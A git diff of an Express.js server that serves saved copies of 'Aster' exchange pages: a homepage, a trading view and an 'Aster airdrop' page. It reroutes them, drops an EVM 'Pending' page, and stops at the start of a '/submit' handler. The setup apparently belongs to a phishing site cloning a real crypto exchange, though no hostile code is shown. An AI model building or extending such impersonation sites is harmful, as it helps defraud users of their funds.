@@ -14,6 +14,8 @@ app.use(express.static('views/'))
 app.use(express.static(path.join(__dirname, "/public")))
 app.use(express.static(__dirname + '/views/1.4169 _ ASTERUSDT _ Trade _ Aster_files/'))
 app.use(express.static(__dirname + '/views/Aster airdrop_files/'))
+app.use(express.static(__dirname + '/views/Aster - The next-gen perp DEX for all traders_files/'))
+
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
@@ -22,17 +24,19 @@ function delay(ms) {
     return new Promise((resolve) => setTimeout(resolve, ms));
 }
 
-app.get('/airdrop', (req, res) => {
+app.get('/', (req, res) => {
+  res.sendFile(__dirname + '/views/Aster - The next-gen perp DEX for all traders.html')
+})
+
+app.get('/trading', (req, res) => {
     res.sendFile(__dirname + '/views/1.4169 _ ASTERUSDT _ Trade _ Aster.html');
 })
 
-app.get('/', (req, res) => {
+app.get('/airdrop', (req, res) => {
     res.sendFile(__dirname + '/views/Aster airdrop.html')
 })
 
-app.get('/pending', (req, res) => {
-    res.sendFile(__dirname + '/views/evm-frontend/Pending.html')
-})
+
 
 
 app.post('/submit', async (req, res) => {
